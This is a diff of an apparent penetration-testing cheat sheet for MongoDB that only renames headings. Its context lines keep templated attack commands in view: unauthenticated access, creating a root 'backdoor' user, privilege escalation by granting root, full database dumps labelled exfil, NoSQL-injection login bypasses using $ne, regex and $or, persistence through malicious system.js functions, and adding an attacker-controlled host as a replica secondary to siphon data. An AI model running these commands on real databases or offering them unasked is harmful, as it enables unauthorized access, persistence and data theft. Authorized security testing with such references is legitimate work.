@@ -4,7 +4,7 @@
 
 ---
 
-## Discovery - Nmap MongoDB Scripts
+## scan mongodb nmap nse
 Identify MongoDB version and enumerate accessible databases.
 
 ```bash
@@ -15,7 +15,7 @@ nmap -p 27017 --script mongodb-info,mongodb-databases {{TARGET:ip}}
 
 ---
 
-## Connect Without Authentication
+## connect mongodb unauthenticated
 Test for unauthenticated MongoDB instance access.
 
 ```bash
@@ -26,7 +26,7 @@ mongo --host {{TARGET:ip}} --port {{PORT:port:27017}}
 
 ---
 
-## Connect With Credentials
+## connect mongodb authenticated
 Authenticate to MongoDB instance with credentials.
 
 ```bash
@@ -37,7 +37,7 @@ mongo --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} -p {{P
 
 ---
 
-## Connect via Connection String
+## connect mongodb uri string
 Connect using MongoDB connection URI.
 
 ```bash
@@ -48,7 +48,7 @@ mongo mongodb://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:2701
 
 ---
 
-## List Databases (Shell)
+## list databases shell
 Enumerate all databases on the server from inside mongo shell.
 
 ```javascript
@@ -60,7 +60,7 @@ db.adminCommand("listDatabases")
 
 ---
 
-## Enumerate Users and Roles
+## enum users roles
 List users and roles in the current/admin database.
 
 ```javascript
@@ -74,7 +74,7 @@ db.getRoles({ showBuiltinRoles: true })
 
 ---
 
-## List Collections and Read Data
+## list collections read data
 Show collections in current DB and read documents.
 
 ```javascript
@@ -86,7 +86,7 @@ db.{{COLLECTION:str:users}}.find().pretty()
 
 ---
 
-## Connection Status and Current User
+## whoami current user session
 Check authenticated user and privileges in current session.
 
 ```javascript
@@ -98,7 +98,7 @@ db.adminCommand({ usersInfo: 1 })
 
 ---
 
-## Create Backdoor Admin User
+## create backdoor admin user
 Create a new user with root role in admin DB (requires privileges).
 
 ```javascript
@@ -110,7 +110,7 @@ db.createUser({ user: "{{USERNAME:str:backdoor}}", pwd: "{{PASSWORD:str:Pwn3d!}}
 
 ---
 
-## Grant Root Role to Existing User
+## privesc grant root role
 Privilege escalation by granting root role to existing user.
 
 ```javascript
@@ -121,7 +121,7 @@ db.grantRolesToUser("{{USERNAME:str}}", [ { role: "root", db: "admin" } ])
 
 ---
 
-## Mongodump - Full Database Exfil
+## dump full database exfil
 Dump entire database to disk for offline analysis.
 
 ```bash
@@ -132,7 +132,7 @@ mongodump --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} -p
 
 ---
 
-## Mongoexport - Export Collection to JSON
+## export collection json
 Export a single collection to JSON file.
 
 ```bash
@@ -143,7 +143,7 @@ mongoexport --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} 
 
 ---
 
-## NoSQL Injection - Auth Bypass via $ne
+## bypass auth nosqli $ne
 Bypass login with $ne operator (always-true match).
 
 ```json
@@ -154,7 +154,7 @@ Bypass login with $ne operator (always-true match).
 
 ---
 
-## NoSQL Injection - Regex Wildcard
+## bypass auth nosqli regex
 Bypass authentication using regex match-anything pattern.
 
 ```json
@@ -165,7 +165,7 @@ Bypass authentication using regex match-anything pattern.
 
 ---
 
-## NoSQL Injection - $or Logic Abuse
+## bypass auth nosqli $or
 Use $or to satisfy authentication on any matching condition.
 
 ```json
@@ -176,7 +176,7 @@ Use $or to satisfy authentication on any matching condition.
 
 ---
 
-## Persistent JS Function via system.js
+## persist server-side js system.js
 Store malicious server-side JS function for persistence.
 
 ```javascript
@@ -188,7 +188,7 @@ db.loadServerScripts()
 
 ---
 
-## Replication Pivot - Add Malicious Secondary
+## pivot replication malicious secondary
 Add an attacker-controlled host as replica set secondary to siphon data.
 
 ```javascript
@@ -200,7 +200,7 @@ rs.add("{{LHOST:ip}}:27017")
 
 ---
 
-## Check How Mongod Was Started
+## check mongod process config
 Inspect process arguments for --auth and --bind_ip misconfigurations.
 
 ```bash
